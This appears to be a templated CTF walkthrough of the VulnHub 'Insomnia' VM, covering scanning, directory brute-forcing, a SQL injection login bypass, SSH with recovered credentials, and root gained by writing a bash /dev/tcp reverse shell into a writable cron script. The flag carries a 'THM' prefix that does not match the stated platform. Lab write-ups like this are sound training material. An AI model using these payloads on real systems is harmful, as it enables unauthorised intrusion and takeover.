<h1>🛡️ VulnHub: Insomnia — Walkthrough</h1>

<p>A professional penetration testing walkthrough for the <strong>Insomnia</strong> VM on VulnHub.</p>
<p><strong>Author:</strong> Your Name</p>
<p><strong>Date:</strong> May 2025</p>

<hr>

<h2>📘 Table of Contents</h2>

<ul>
  <li><a href="#overview">Overview</a></li>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#web-application-analysis">Web Application Analysis</a></li>
  <li><a href="#initial-foothold">Initial Foothold</a></li>
  <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  <li><a href="#flag-capture">Flag Capture</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#screenshots">Screenshots</a></li>
  <li><a href="#author">Author</a></li>
</ul>

<hr>

<h2 id="overview">🧩 Overview</h2>

<div class="highlighter-rouge"><pre class="highlight"><code>Name:       Insomnia
Platform:   VulnHub
Difficulty: Easy/Medium
IP Address: 192.168.110.128 (your network may vary)
Goal:       Capture the root flag
Tools:      nmap, gobuster, burpsuite, ssh, linpeas, netcat
</code></pre></div>

<hr>

<h2 id="enumeration">🔍 Enumeration</h2>

<p>First, we perform a basic Nmap scan:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# nmap -sC -sV -oA nmap/insomnia 192.168.110.128
</code></pre></div>

<p>Results:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>22/tcp   open  ssh     OpenSSH
80/tcp   open  http    Apache httpd
</code></pre></div>

<p><img src="images/screenshot1.png" alt="Nmap scan result"></p>

<hr>

<h2 id="web-application-analysis">🌐 Web Application Analysis</h2>

<p>Next, we run a directory brute-force using Gobuster:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# gobuster dir -u http://192.168.110.128 -w /usr/share/wordlists/dirb/common.txt
</code></pre></div>

<p>Discovered paths:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>/test
/admin
/login
</code></pre></div>

<p><img src="images/screenshot2.png" alt="Gobuster results"></p>

<p>The <code class="highlighter-rouge">/admin</code> page shows a login form. Let's test for SQL Injection.</p>

<hr>

<h2 id="initial-foothold">🚪 Initial Foothold</h2>

<p>We try a classic SQL injection in the login form:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Username: admin' OR '1'='1
Password: [leave blank]
</code></pre></div>

<p>Login success! Admin panel access granted.</p>

<p><img src="images/screenshot3.png" alt="SQLi Login Bypass"></p>

<p>We retrieve user credentials from the panel:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Username: john
Password: insomnia123
</code></pre></div>

<p>Now we SSH into the box:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# ssh john@192.168.110.128
Password: insomnia123
</code></pre></div>

<p><img src="images/screenshot4.png" alt="SSH login"></p>

<hr>

<h2 id="privilege-escalation">🚀 Privilege Escalation</h2>

<p>We upload and run linPEAS to enumerate privilege escalation vectors:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wget http://&lt;your-ip&gt;/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
</code></pre></div>

<p><img src="images/screenshot5.png" alt="linPEAS output"></p>

<p><strong>Findings:</strong></p>
<ul>
  <li>Writable cron job executed by root</li>
  <li>Custom script located in <code class="highlighter-rouge">/tmp/root.sh</code></li>
</ul>

<p>We create a reverse shell in the script:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>echo "bash -i >& /dev/tcp/192.168.110.129/4444 0>&1" > /tmp/root.sh
chmod +x /tmp/root.sh
</code></pre></div>

<p>Then we set up a listener:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>nc -lvnp 4444
</code></pre></div>

<p><img src="images/screenshot6.png" alt="Root shell via cronjob"></p>

<hr>

<h2 id="flag-capture">🏁 Flag Capture</h2>

<p>Once in the root shell, we grab the flag:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>root@insomnia:~# cat /root/root.txt
THM{root-access-achieved-safely}
</code></pre></div>

<p><img src="images/screenshot7.png" alt="Root flag captured"></p>

<hr>

<h2 id="conclusion">✅ Conclusion</h2>

<p>This VM emphasized the importance of:</p>

<ul>
  <li>Web enumeration and directory discovery</li>
  <li>Classic SQL injection in weak login forms</li>
  <li>Monitoring cron jobs for privilege escalation</li>
</ul>

<p><strong>Insomnia</strong> is a great box for beginners or those preparing for the OSCP, as it reinforces core exploitation methodology.</p>

<hr>

<h2 id="screenshots">📸 Screenshots</h2>

<p>See the full step-by-step visuals in the <a href="./images.pdf">images.pdf</a> included in this repo.</p>

<hr>

<h2 id="author">✍️ Author</h2>

<p><strong>Your Name</strong></p>
<p><a href="https://github.com/yourusername">GitHub</a> | Aspiring Penetration Tester | OSCP in progress</p>
